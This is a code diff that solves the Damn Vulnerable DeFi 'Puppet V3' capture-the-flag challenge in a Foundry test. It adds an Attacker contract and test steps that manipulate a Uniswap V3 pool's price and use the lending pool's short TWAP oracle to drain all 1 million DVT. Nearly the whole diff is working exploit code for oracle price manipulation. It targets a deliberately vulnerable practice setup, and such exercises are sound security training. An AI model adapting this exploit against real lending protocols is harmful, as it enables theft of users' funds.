@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,10 +63,7 @@ contract PuppetV3Challenge is Test {
         address token0 = isWethFirst ? address(weth) : address(token);
         address token1 = isWethFirst ? address(token) : address(weth);
         positionManager.createAndInitializePoolIfNecessary({
-            token0: token0,
-            token1: token1,
-            fee: FEE,
-            sqrtPriceX96: _encodePriceSqrt(1, 1)
+            token0: token0, token1: token1, fee: FEE, sqrtPriceX96: _encodePriceSqrt(1, 1)
         });
 
         IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
@@ -119,7 +117,36 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
+
+        uint256 depositOfWETHRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Deposit of WETH required to borrow 1 million DVT before swap:", depositOfWETHRequired);
+
+        (uint160 sqrtPriceX96, int24 tick,,,,,) = uniswapPool.slot0();
+
+        console.log("sqrtPriceX96 before swap:", sqrtPriceX96);
+        console.log("tick before swap:", tick);
+
+        Attacker attacker = new Attacker(weth, token, uniswapPool, lendingPool, positionManager);
+        weth.transfer(address(attacker), weth.balanceOf(player));
+        token.transfer(address(attacker), token.balanceOf(player));
+        attacker.swap();
+
+        (sqrtPriceX96, tick,,,,,) = uniswapPool.slot0();
+
+        console.log("sqrtPriceX96 after swap:", sqrtPriceX96);
+        console.log("tick after swap:", tick);
+
+        // Give some time let TWAP catch up to the new price
+        skip(100);
+
+        depositOfWETHRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Deposit of WETH required to borrow 1 million DVT after swap:", depositOfWETHRequired);
+
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
@@ -133,5 +160,69 @@ contract PuppetV3Challenge is Test {
 
     function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
         return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
+    }
+}
+
+contract Attacker {
+    WETH public immutable weth;
+    DamnValuableToken public immutable token;
+    IUniswapV3Pool public immutable uniswapPool;
+    PuppetV3Pool public immutable lendingPool;
+    INonfungiblePositionManager public immutable positionManager;
+    bool public immutable isWethFirst;
+    address public immutable player;
+
+    uint24 constant FEE = 3000;
+    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
+
+    constructor(
+        WETH _weth,
+        DamnValuableToken _token,
+        IUniswapV3Pool _uniswapPool,
+        PuppetV3Pool _lendingPool,
+        INonfungiblePositionManager _positionManager
+    ) {
+        weth = _weth;
+        token = _token;
+        uniswapPool = _uniswapPool;
+        lendingPool = _lendingPool;
+        positionManager = _positionManager;
+        isWethFirst = address(weth) < address(token);
+        player = msg.sender;
+    }
+
+    function swap() external {
+        uint256 amountIn = token.balanceOf(address(this));
+        bool zeroForOne = isWethFirst ? false : true; // Swap token for WETH if WETH is token0, else swap WETH for token
+        uint160 sqrtPriceLimitX96 = zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1;
+
+        uniswapPool.swap(
+            address(this),
+            zeroForOne, // swap token for WETH
+            int256(amountIn),
+            sqrtPriceLimitX96,
+            ""
+        );
+    }
+
+    function uniswapV3SwapCallback(
+        int256 amount0Delta,
+        int256 amount1Delta,
+        bytes calldata /*_data*/
+    )
+        external
+    {
+        console.log("amount0Delta: ", amount0Delta);
+        console.log("amount1Delta: ", amount1Delta);
+        require(amount0Delta > 0 || amount1Delta > 0); // swaps entirely within 0-liquidity regions are not supported
+
+        uint256 amountToPay = amount0Delta > 0 ? uint256(amount0Delta) : uint256(amount1Delta);
+
+        token.transfer(address(uniswapPool), amountToPay);
+        console.log("DVT balance:", token.balanceOf(address(this)));
+        console.log("WETH balance:", weth.balanceOf(address(this)));
+
+        token.transfer(player, token.balanceOf(address(this)));
+        weth.transfer(player, weth.balanceOf(address(this)));
     }
 }
